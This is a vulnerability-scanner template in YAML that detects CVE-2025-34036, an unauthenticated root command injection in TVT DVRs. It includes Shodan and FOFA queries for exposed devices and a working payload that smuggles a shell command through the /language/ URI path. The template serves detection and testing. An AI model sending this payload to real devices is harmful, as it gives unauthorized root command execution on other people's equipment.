id: CVE-2025-34036

info:
  name: TVT DVR - Unauthenticated Command Injection
  author: sushant6095
  severity: critical
  description: |
    TVT white-labeled DVRs contain a command injection vulnerability caused by unsanitized input in the URI path
    for language extraction in Cross Web Server. This allows unauthenticated remote attackers to execute arbitrary
    commands as root via the /language/ endpoint.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-34036
    - https://web.archive.org/web/20160322204109/http://www.kerneronsec.com/2016/02/remote-code-execution-in-cctv-dvrs-of.html
    - https://www.exploit-db.com/exploits/39596
  classification:
    cpe: cpe:2.3:o:tvt:dvr_firmware:*:*:*:*:*:*:*:*
    cve-id: CVE-2025-34036
    cwe-id: CWE-78
  metadata:
    verified: true
    max-request: 2
    vendor: tvt
    product: dvr_firmware
    shodan-query: '"Cross Web Server" port:81,82,8000'
    fofa-query: 'server="Cross Web Server"'
  tags: cve,cve2025,tvt,dvr,cctv,rce,command-injection,intrusive

http:
  - raw:
      # Stage 1: Detect Cross Web Server
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36

      # Stage 2: Command injection via language parameter - executes 'id' command
      - |
        GET /language/Swedish${IFS}&&id>/tmp/cmd_output&&tar${IFS}/string.js HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36

    matchers-condition: and
    matchers:
      # Verify Cross Web Server is present
      - type: word
        part: header_1,body_1
        words:
          - "Cross Web Server"
        condition: or

      # Verify command injection by checking for typical response patterns
      - type: word
        part: body_2
        words:
          - "extract language packet"
          - "Language parameter processed"
        condition: or

      # Ensure proper HTTP responses
      - type: status
        status:
          - 200

    extractors:
      # Extract server information
      - type: regex
        part: header_1
        name: server_info
        group: 1
        regex:
          - "Server: ([^\r\n]+)"
